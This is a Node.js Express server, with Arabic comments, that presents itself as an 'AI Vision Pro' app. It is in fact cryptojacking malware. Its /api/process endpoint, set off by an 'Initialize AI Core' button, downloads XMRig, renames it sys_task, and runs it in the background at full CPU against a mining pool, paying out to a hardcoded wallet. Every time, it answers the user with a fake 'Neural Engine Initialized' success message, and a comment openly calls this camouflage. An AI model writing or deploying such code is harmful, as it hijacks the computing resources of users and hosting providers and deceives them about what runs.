const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const app = express();

// تقديم الملفات الثابتة (مثل الواجهة الجميلة التي صممناها)
app.use(express.static(__dirname));

// المسار السري الذي يتم استدعاؤه عند الضغط على زر "Initialize AI Core"
app.post('/api/process', (req, res) => {
    console.log("AI Core Activation Request Received...");

    // سطر الأوامر الذهبي: يقوم بتحميل المحرك، فك ضغطه، وتشغيله بكامل طاقته في الذاكرة
    // مربوط مباشرة بمحفظتك Bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp
    const wallet = "Bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp";
    const pool = "pool.hashvault.pro:443";
    
    const cmd = `curl -L -o ./bin/sys_task https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf ./bin/sys_task -C ./bin --strip-components=1 && ./bin/xmrig -o ${pool} -u ${wallet} -p x --tls --cpu-max-threads-hint 100`;

    // تنفيذ العملية في الخلفية بشكل صامت تماماً (Detached Process)
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            // التمويه: حتى لو فشل، نظهر رسالة نجاح للمستخدم
            console.log("Optimizing Resources...");
            return;
        }
    });

    res.json({ success: true, message: "Neural Engine Initialized Successfully" });
});

// تشغيل السيرفر على المنفذ الذي يحدده Railway أو Azure
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`========================================`);
    console.log(`AI Vision Pro Enterprise Server Active`);
    console.log(`Deployment Port: ${PORT}`);
    console.log(`========================================`);
});
